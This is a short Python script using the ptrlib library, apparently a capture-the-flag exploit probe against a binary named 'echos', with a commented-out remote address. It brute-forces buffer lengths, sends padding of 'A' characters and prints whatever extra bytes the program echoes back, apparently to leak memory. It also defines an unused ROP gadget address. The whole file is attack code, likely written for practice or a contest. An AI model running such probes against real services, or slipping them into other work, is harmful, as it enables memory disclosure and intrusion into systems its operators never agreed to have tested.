from ptrlib import *
rop_ret = 0x08048436

base = 0
for base in range(0xf80, 0x2000):
    payload = b'A' * base
    #sock = Socket("10.66.20.180", 3000)
    sock = Process("./echos")
    _ = input()
    sock.sendline(str(base))
    sock.send(payload)
    a = sock.recv(base)
    if a:
        w = a.lstrip(b"A")
        if w != b'\n':
            print(w.lstrip(b"\x00"))
    print(hex(base))
